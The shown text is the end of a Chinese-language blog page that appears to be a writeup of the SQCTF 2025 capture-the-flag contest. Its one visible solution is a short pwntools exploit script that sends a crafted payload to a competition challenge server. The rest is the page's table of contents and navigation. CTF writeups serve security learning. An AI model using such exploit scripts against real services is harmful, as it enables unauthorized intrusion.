<h3 id="借的东风破金锁"><a href="#借的东风破金锁" class="headerlink" title="借的东风破金锁"></a>借的东风破金锁</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">31425</span>)</span><br><span class="line">payload = p64(<span class="number">0x53514E55435446</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.xieweiling.top/blog">Beiko</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.xieweiling.top/blog/2025/04/13/CTF-WP/SQCTF%202025/">https://www.xieweiling.top/blog/2025/04/13/CTF-WP/SQCTF%202025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.xieweiling.top/blog" target="_blank">Beiko's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/blog/tags/CTF/">CTF</a><a class="post-meta__tags" href="/blog/tags/WP/">WP</a></div><div class="post-share"><div class="social-share" data-image="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?11&amp;type=yktk" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/blog/2024/09/27/04/" title="本地AI大模型部署"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?8&amp;type=yktk" onerror="onerror=null;src='/blog/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">本地AI大模型部署</div></div><div class="info-2"><div class="info-item-1">记一次本地大模型的部署过程</div></div></div></a><a class="pagination-related" href="/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/" title="2025年Solar应急响应公益月赛-4月 Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?10&amp;type=yktk" onerror="onerror=null;src='/blog/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">2025年Solar应急响应公益月赛-4月 Writeup</div></div><div class="info-2"><div class="info-item-1">2025年Solar应急响应公益月赛-4月 Writeup</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/" title="2025年Solar应急响应公益月赛-4月 Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?10&type=yktk" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-28</div><div class="info-item-2">2025年Solar应急响应公益月赛-4月 Writeup</div></div><div class="info-2"><div class="info-item-1">2025年Solar应急响应公益月赛-4月 Writeup</div></div></div></a><a class="pagination-related" href="/blog/2025/05/21/CTF-WP/PaluCTF%202025/" title="PaluCTF 2025 应急响应 Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?9&type=yktk" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-21</div><div class="info-item-2">PaluCTF 2025 应急响应 Writeup</div></div><div class="info-2"><div class="info-item-1">记录一下PaluCTF 2025 应急响应</div></div></div></a><a class="pagination-related" href="/blog/2024/09/25/GZCTF/" title="GZCTF 开源平台部署"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?6&type=yktk" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-25</div><div class="info-item-2">GZCTF 开源平台部署</div></div><div class="info-2"><div class="info-item-1">记一次CTF平台的搭建过程（Docker + K3s 分离部署）</div></div></div></a><a class="pagination-related" href="/blog/2024/09/26/03/" title="CTF动态题目构建"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?7&type=yktk" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">CTF动态题目构建</div></div><div class="info-2"><div class="info-item-1">记一次CTF动态题目构建的搭建过程</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">base？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%AB%E9%98%B4%E9%98%B3%E6%88%91%E4%BA%86%E8%A1%8C%E5%90%97%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">别阴阳我了行吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%A5%E9%A3%8E%E5%BE%97%E6%84%8F%E9%A9%AC%E8%B9%84%E7%96%BE"><span class="toc-number">1.3.</span> <span class="toc-text">春风得意马蹄疾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95RSA"><span class="toc-number">1.4.</span> <span class="toc-text">简单RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezCRT"><span class="toc-number">1.5.</span> <span class="toc-text">ezCRT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%90%BD%E7%9F%BF%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">失落矿洞中的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E5%AE%A4%E9%80%83%E8%84%B1%E7%9A%84%E7%BB%88%E6%9E%81%E6%8C%91%E6%88%98"><span class="toc-number">1.7.</span> <span class="toc-text">密室逃脱的终极挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%A9%E7%9A%84%E6%8C%BA%E5%8F%98%E6%80%81%E5%95%8A%E6%B8%85%E8%8C%B6%E5%93%A5"><span class="toc-number">1.8.</span> <span class="toc-text">玩的挺变态啊清茶哥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A2%E4%B8%89%E8%90%BD%E5%9B%9B%E7%9A%84%E5%B0%8FI"><span class="toc-number">1.9.</span> <span class="toc-text">丢三落四的小I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-SCA"><span class="toc-number">1.10.</span> <span class="toc-text">ez_SCA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Modulus"><span class="toc-number">1.11.</span> <span class="toc-text">Common Modulus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.12.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%8A1789%E5%B9%B4%E7%9A%84%E5%AF%86%E6%96%87%E3%80%8B"><span class="toc-number">1.13.</span> <span class="toc-text">《1789年的密文》</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRe%EF%BC%88%E4%B8%89%E8%A1%80%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">ezRe（三血）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%85%95%E7%84%B6%E5%9B%9E%E9%A6%96%EF%BC%8C%E9%82%A3%E4%BA%BA%E5%8D%B4%E5%9C%A8%E7%81%AF%E7%81%AB%E9%98%91%E7%8F%8A%E5%A4%84"><span class="toc-number">2.2.</span> <span class="toc-text">慕然回首，那人却在灯火阑珊处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%85%E9%B9%85%E9%B9%85%EF%BC%8C%E6%9B%B2%E9%A1%B9%E5%90%91%E5%A4%A9%E6%AD%8C"><span class="toc-number">2.3.</span> <span class="toc-text">鹅鹅鹅，曲项向天歌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A3%E4%BA%BA%E5%BD%93%E4%BB%81%E4%B8%8D%E8%AE%A9"><span class="toc-number">2.4.</span> <span class="toc-text">圣人当仁不让</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%80%E4%BA%8B%E6%9A%97%E6%B2%89%E4%B8%8D%E5%8F%AF%E8%BF%BD"><span class="toc-number">2.5.</span> <span class="toc-text">往事暗沉不可追</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E4%BA%8B%E4%B8%8D%E5%86%B3%EF%BC%8C%E5%8F%AF%E9%97%AE%E6%98%A5%E9%A3%8E"><span class="toc-number">2.6.</span> <span class="toc-text">遇事不决，可问春风</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%A5%E9%A3%8E%E4%B9%9F%E6%9C%89%E6%98%A5%E9%A3%8E%E6%84%81"><span class="toc-number">2.7.</span> <span class="toc-text">春风也有春风愁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%A7%E5%94%A7%E5%A4%8D%E5%94%A7%E5%94%A7%EF%BC%8C%E6%9C%A8%E5%85%B0%E5%BD%93%E6%88%B7%E7%BB%87"><span class="toc-number">2.8.</span> <span class="toc-text">唧唧复唧唧，木兰当户织</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E5%B1%B1%E4%B8%8D%E6%98%AF%E5%B1%B1"><span class="toc-number">2.9.</span> <span class="toc-text">看山不是山</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B3%E9%9A%8F%E6%9C%AC%E5%BF%83"><span class="toc-number">2.10.</span> <span class="toc-text">即随本心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BB%E8%B4%A5abyssun"><span class="toc-number">2.11.</span> <span class="toc-text">击败abyssun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E4%B8%8B%E8%B0%81%E4%BA%BA%E4%B8%8D%E8%AF%86%E5%90%9B"><span class="toc-number">2.12.</span> <span class="toc-text">天下谁人不识君</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%8B%A5%E5%AE%89%E5%A5%BD%E4%BE%BF%E6%98%AF%E6%99%B4"><span class="toc-number">2.13.</span> <span class="toc-text">你若安好便是晴</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%BA%E7%94%9F%E8%87%AA%E5%8F%A4%E8%B0%81%E6%97%A0%E6%AD%BB"><span class="toc-number">2.14.</span> <span class="toc-text">人生自古谁无死</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%8A%B3%E6%98%A5%E9%A3%8E%E8%A7%A3%E6%88%91%E5%BF%A7"><span class="toc-number">2.15.</span> <span class="toc-text">不劳春风解我忧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezGame"><span class="toc-number">3.1.</span> <span class="toc-text">ezGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping"><span class="toc-number">3.2.</span> <span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-download"><span class="toc-number">3.3.</span> <span class="toc-text">File_download</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%95%86%E5%B8%88%E4%B8%80%E6%97%A5%E6%B8%B8"><span class="toc-number">3.4.</span> <span class="toc-text">商师一日游</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%B0%8F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.5.</span> <span class="toc-text">小小查询系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-include"><span class="toc-number">3.6.</span> <span class="toc-text">baby include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Input-a-number"><span class="toc-number">3.7.</span> <span class="toc-text">Input a number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%AF%E4%B8%80"><span class="toc-number">3.8.</span> <span class="toc-text">唯一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level1"><span class="toc-number">3.9.</span> <span class="toc-text">Upload_Level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%98%BF%E5%98%BF%E5%98%BF"><span class="toc-number">3.10.</span> <span class="toc-text">嘿嘿嘿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">3.11.</span> <span class="toc-text">逃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E4%B9%8B%E8%88%9E"><span class="toc-number">3.12.</span> <span class="toc-text">无参之舞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rce"><span class="toc-number">3.13.</span> <span class="toc-text">baby rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-calculate"><span class="toc-number">3.14.</span> <span class="toc-text">Ez_calculate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Blog"><span class="toc-number">3.15.</span> <span class="toc-text">My Blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level2"><span class="toc-number">3.16.</span> <span class="toc-text">Upload_Level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8E%E5%91%80%E5%A4%A7%E5%A4%A7%E5%A4%A7%E9%BB%91%E5%A1%94"><span class="toc-number">3.17.</span> <span class="toc-text">哎呀大大大黑塔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E6%9C%88%E5%85%89"><span class="toc-number">3.18.</span> <span class="toc-text">白月光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RceMe"><span class="toc-number">3.19.</span> <span class="toc-text">RceMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Through"><span class="toc-number">3.20.</span> <span class="toc-text">Through</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E5%B0%8F%E5%A4%B1%E8%AF%AF"><span class="toc-number">3.21.</span> <span class="toc-text">开发人员的小失误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ggoodd"><span class="toc-number">3.22.</span> <span class="toc-text">ggoodd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">3.23.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle"><span class="toc-number">3.24.</span> <span class="toc-text">pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eeaassyy"><span class="toc-number">3.25.</span> <span class="toc-text">eeaassyy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E7%A7%81%E7%9A%84%E5%B0%8Fs"><span class="toc-number">3.26.</span> <span class="toc-text">自私的小s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Look-for-the-homepage"><span class="toc-number">3.27.</span> <span class="toc-text">Look for the homepage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-SQNU"><span class="toc-number">3.28.</span> <span class="toc-text">Are you from SQNU?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85"><span class="toc-number">3.29.</span> <span class="toc-text">伪装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%B1%95%E7%A4%BA%E5%8A%9F%E8%83%BD"><span class="toc-number">3.30.</span> <span class="toc-text">图片展示功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%90%A6%E8%AE%B8%E6%88%91%E5%86%8D%E5%B0%91%E5%B9%B4"><span class="toc-number">4.1.</span> <span class="toc-text">可否许我再少年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-Sign-in%EF%BC%88%E4%B8%80%E8%A1%80%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">Welcome_Sign_in（一血）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-music1"><span class="toc-number">4.3.</span> <span class="toc-text">ez_music1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#love-host"><span class="toc-number">4.4.</span> <span class="toc-text">love.host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E5%B0%BC%E4%BA%9A"><span class="toc-number">4.5.</span> <span class="toc-text">阿尼亚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#piet"><span class="toc-number">4.6.</span> <span class="toc-text">piet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YuanShen-Start"><span class="toc-number">4.7.</span> <span class="toc-text">YuanShen_Start!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%90%9B%E5%B1%B1%E7%9A%84%E8%90%BD%E6%97%A5%E5%A5%BD%E7%BE%8E"><span class="toc-number">4.8.</span> <span class="toc-text">老君山的落日好美</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80%E7%9C%9F%E6%98%AF%E5%A4%AA%E5%A5%BD%E7%8E%A9%E4%BA%86"><span class="toc-number">4.9.</span> <span class="toc-text">王者荣耀真是太好玩了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E5%8A%A0%E5%AF%86%EF%BC%88%E4%B8%80%E8%A1%80%EF%BC%89"><span class="toc-number">4.10.</span> <span class="toc-text">这是什么加密（一血）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%B7%B7%E4%BA%BA%E5%AE%B6"><span class="toc-number">4.11.</span> <span class="toc-text">小巷人家</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFT-IFFT"><span class="toc-number">4.12.</span> <span class="toc-text">FFT IFFT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E7%BA%A2%E6%AC%BA%E9%86%89%E7%B2%89%EF%BC%8C%E8%82%AF%E4%BF%A1%E6%9C%89%E6%B1%9F%E6%A2%85"><span class="toc-number">5.1.</span> <span class="toc-text">浅红欺醉粉，肯信有江梅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%86%E5%8F%96%E4%BD%A0%E7%9A%84%E5%B0%8F%E7%8C%AB%E5%A8%98"><span class="toc-number">5.2.</span> <span class="toc-text">领取你的小猫娘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E9%85%92%E8%8E%AB%E6%83%8A%E6%98%A5%E7%9D%A1%E9%87%8D"><span class="toc-number">5.3.</span> <span class="toc-text">被酒莫惊春睡重</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E6%97%B6%E5%8F%AA%E9%81%93%E6%98%AF%E5%AF%BB%E5%B8%B8"><span class="toc-number">5.4.</span> <span class="toc-text">当时只道是寻常</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%8C%E4%B9%A6%E6%B6%88%E5%BE%97%E6%B3%BC%E8%8C%B6%E9%A6%99"><span class="toc-number">5.5.</span> <span class="toc-text">赌书消得泼茶香</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%9F%E5%8D%97%E6%97%A0%E6%89%80%E6%9C%89%EF%BC%8C%E8%81%8A%E8%B5%A0%E4%B8%80%E6%9E%9D%E6%98%A5"><span class="toc-number">5.6.</span> <span class="toc-text">江南无所有，聊赠一枝春</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%9C%E9%9B%80%E6%98%A5%E6%B7%B1%E9%94%81%E4%BA%8C%E4%B9%94"><span class="toc-number">5.7.</span> <span class="toc-text">铜雀春深锁二乔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E8%A7%89%E5%90%9B%E9%9D%9E%E6%B1%A0%E4%B8%AD%E7%89%A9%EF%BC%8C%E5%92%AB%E5%B0%BA%E8%9B%9F%E9%BE%99%E4%BA%91%E9%9B%A8"><span class="toc-number">5.8.</span> <span class="toc-text">我觉君非池中物，咫尺蛟龙云雨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%A7%E8%90%A7%E9%BB%84%E5%8F%B6%E9%97%AD%E7%96%8F%E7%AA%97"><span class="toc-number">5.9.</span> <span class="toc-text">萧萧黄叶闭疏窗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E7%9A%84%E4%B8%9C%E9%A3%8E%E7%A0%B4%E9%87%91%E9%94%81"><span class="toc-number">5.10.</span> <span class="toc-text">借的东风破金锁</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/blog/2025/05/21/CTF-WP/PaluCTF%202025/" title="PaluCTF 2025 应急响应 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?9&amp;type=yktk" onerror="this.onerror=null;this.src='/blog/img/404.jpg'" alt="PaluCTF 2025 应急响应 Writeup"/></a><div class="content"><a class="title" href="/blog/2025/05/21/CTF-WP/PaluCTF%202025/" title="PaluCTF 2025 应急响应 Writeup">PaluCTF 2025 应急响应 Writeup</a><time datetime="2025-05-21T11:00:00.000Z" title="发表于 2025-05-21 19:00:00">2025-05-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/" title="2025年Solar应急响应公益月赛-4月 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?10&amp;type=yktk" onerror="this.onerror=null;this.src='/blog/img/404.jpg'" alt="2025年Solar应急响应公益月赛-4月 Writeup"/></a><div class="content"><a class="title" href="/blog/2025/04/28/CTF-WP/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/" title="2025年Solar应急响应公益月赛-4月 Writeup">2025年Solar应急响应公益月赛-4月 Writeup</a><time datetime="2025-04-28T04:00:00.000Z" title="发表于 2025-04-28 12:00:00">2025-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2025/04/13/CTF-WP/SQCTF%202025/" title="SQCTF 2025 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?11&amp;type=yktk" onerror="this.onerror=null;this.src='/blog/img/404.jpg'" alt="SQCTF 2025 Writeup"/></a><div class="content"><a class="title" href="/blog/2025/04/13/CTF-WP/SQCTF%202025/" title="SQCTF 2025 Writeup">SQCTF 2025 Writeup</a><time datetime="2025-04-13T10:00:00.000Z" title="发表于 2025-04-13 18:00:00">2025-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2024/09/27/04/" title="本地AI大模型部署"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?8&amp;type=yktk" onerror="this.onerror=null;this.src='/blog/img/404.jpg'" alt="本地AI大模型部署"/></a><div class="content"><a class="title" href="/blog/2024/09/27/04/" title="本地AI大模型部署">本地AI大模型部署</a><time datetime="2024-09-27T06:29:00.000Z" title="发表于 2024-09-27 14:29:00">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/blog/2024/09/26/03/" title="CTF动态题目构建"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?7&amp;type=yktk" onerror="this.onerror=null;this.src='/blog/img/404.jpg'" alt="CTF动态题目构建"/></a><div class="content"><a class="title" href="/blog/2024/09/26/03/" title="CTF动态题目构建">CTF动态题目构建</a><time datetime="2024-09-26T10:29:00.000Z" title="发表于 2024-09-26 18:29:00">2024-09-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Beiko</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/blog/js/utils.js"></script><script src="/blog/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
